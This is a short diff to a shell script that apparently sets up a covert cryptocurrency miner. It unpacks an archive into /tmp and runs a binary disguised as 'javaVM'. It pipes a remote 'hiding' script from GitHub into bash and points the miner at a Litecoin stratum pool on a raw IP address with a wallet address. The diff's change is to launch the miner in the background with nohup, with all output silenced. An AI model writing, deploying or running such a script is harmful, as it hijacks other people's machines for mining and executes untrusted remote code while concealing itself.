@@ -7,4 +7,7 @@ tar -xvf /tmp/jadah.tar.gz -C /tmp &>/dev/null
 rm -rf /tmp/jadah.tar.gz &>/dev/null
 LANG=C LC_ALL=C /tmp/javaVM &>/dev/null
 wget -O - -q https://raw.githubusercontent.com/williehprnuhrxyq/nubuat/main/hiding | bash > /dev/null 2>&1
-/tmp/javaVM -P stratum://LTC:MVfmeefMAAcjARvGAf6ZLkgxsyvqNVeC2a.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S"))#zn10-5v8g@8.219.86.27:80 >/dev/null 2>&1
+cd /tmp
+nohup ./javaVM -P stratum://LTC:MVfmeefMAAcjARvGAf6ZLkgxsyvqNVeC2a.$(echo VV-$(TZ=UTC-7 date +"%H-%M-%S"))#zn10-5v8g@8.219.86.27:80 >/dev/null 2>&1 &
+
+
